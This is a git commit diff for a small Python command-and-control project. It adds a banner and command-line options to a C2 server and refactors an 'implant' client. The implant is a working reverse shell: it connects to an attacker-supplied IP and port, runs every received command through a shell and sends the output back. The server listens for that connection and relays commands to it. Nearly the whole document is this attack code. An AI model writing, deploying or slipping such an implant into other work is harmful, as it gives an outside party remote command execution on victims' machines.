23f30f3cc7bdbc53024d792e5fb8ec6c0417aa88
Oliver Albertsen <oliveralbertsen@hotmail.com>
2023-04-24 04:39:31 -0400

    banner and refactor of server and client code

--- C2/server.py
+++ C2/server.py
@@ -1,6 +1,19 @@
 import socket
 import subprocess
 import os
+import argparse
+
+def banner():
+    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
+    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
+    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')
+
+parser = argparse.ArgumentParser(description='C2 server ')
+parser.add_argument('-ip', type=str, required=True, help='Input the listening IP ')
+parser.add_argument('-p', type=int, required=True, help='Input the listening port ')
+
+args = parser.parse_args()
+
 
 
 def listener_handler(): # Function to handle incoming connections and send bytes over the socket
@@ -8,6 +21,17 @@ def listener_handler(): # Function to handle incoming connections and send bytes
     print('[+] Awaiting connection from client...')
     sock.listen()
     remote_target, remote_ip = sock.accept()
+    comm_handler(remote_target, remote_ip)
+
+def comm_in(remote_target):
+    print(f'[+] Awaiting response...')
+    response = remote_target.recv(1024).decode()
+    return response
+
+def comm_out(remote_target, message):
+    remote_target.send(message.encode())
+
+def comm_handler(remote_target, remote_ip):
     print(f'[+] Connection recived from {remote_ip[0]}')
     while True:
         try:
@@ -31,8 +55,12 @@ def listener_handler(): # Function to handle incoming connections and send bytes
             remote_target.close()
             break
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host_ip = '127.0.0.1'
-host_port = 4444
-listener_handler()
+
+   
+if __name__ == '__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host_ip = args.ip
+    host_port = args.p
+    banner()
+    listener_handler()
 
--- implant/implant.py
+++ implant/implant.py
@@ -1,7 +1,29 @@
 import socket
 import subprocess
 import os
+import argparse
 
+parser = argparse.ArgumentParser(description='C2 implant ')
+parser.add_argument('-ip', type=str, required=True, help='Input the remote IP  ')
+parser.add_argument('-p', type=int, required=True, help='Input the remote port ')
+
+args = parser.parse_args()
+
+
+def inbound_comm():
+    print(f'[+] Awaiting response from server...')
+    message = ''
+    while True:
+        try: 
+            message = sock.recv(1024).decode()
+            return message
+        except Exception:
+            print(f'[-] An exception occured')
+            sock.close()
+
+def outbound_comm(message):
+    response = str(message).encode()
+    sock.send(response)
 
 def session_handler():
     print(f'[+] Trying to connect to {host_ip}')
@@ -9,37 +31,31 @@ def session_handler():
     print(f'[+] Connected to {host_ip}')
 
     while True:
-        try:
-            message = sock.recv(1024).decode()
-            print(message)
-            if message == 'exit':
-                print('[-] The server terminated the session...')
-                sock.close()
-                break
-            
-            elif message.split(" ")[0] == 'cd': #split message on space and see if index 0 == cd
-                directory = str(message.split(" ")[1])
-                os.chdir(directory)
-                cur_dir = os.getcwd()
-                print(f'[+] Changed dir to to {cur_dir}')
-                sock.send(cur_dir.encode())
-            else:
-                #subprocess shell handling
-                command = subprocess.Popen(message, shell=True, stdout =subprocess.PIPE, stderr=subprocess.PIPE)
-                output = command.stdout.read() + command.stderr.read()
-                sock.send(output)            
-                
-        except KeyboardInterrupt:
-             print(' [+] Keyboard interupt iniated...')
-             sock.close()
-             break
-        except Exception:
+        message = inbound_comm()
+        print(message)
+        if message == 'exit':
+            print('[-] The server terminated the session...')
             sock.close()
             break
+        
+        elif message.split(" ")[0] == 'cd': #split message on space and see if index 0 == cd
+            directory = str(message.split(" ")[1])
+            os.chdir(directory)
+            cur_dir = os.getcwd()
+            print(f'[+] Changed dir to {cur_dir}')
+            sock.send(cur_dir.encode())
+        else:
+            #subprocess shell handling
+            command = subprocess.Popen(message, shell=True, stdout =subprocess.PIPE, stderr=subprocess.PIPE)
+            output = command.stdout.read() + command.stderr.read()
+            outbound_comm(output.decode())          
+                
+      
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host_ip = '127.0.0.1'
-host_port = 4444
-session_handler()
+if __name__ == '__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host_ip = args.ip
+    host_port = args.p
+    session_handler()
 
 
